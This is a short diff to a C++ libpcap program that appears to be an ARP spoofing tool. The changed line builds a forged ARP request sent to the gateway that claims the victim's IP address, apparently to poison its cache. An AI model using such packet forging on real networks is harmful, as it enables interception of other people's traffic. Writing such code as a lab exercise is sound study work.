@@ -158,7 +158,7 @@ int main(int argc, char* argv[]) {
         printf("gw mac: %s\n", gw_mac);
 
 
-        arp_packet(packet, my_mac, init_eth_dmac, init_arp_tmac, ArpHdr::Request, gw_ip, victim_ip);
+        arp_packet(packet, my_mac, gw_mac, gw_mac, ArpHdr::Request, victim_ip, gw_ip);
         int res_victim = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
         if (res_victim != 0) {
             fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res_victim, pcap_geterr(handle));
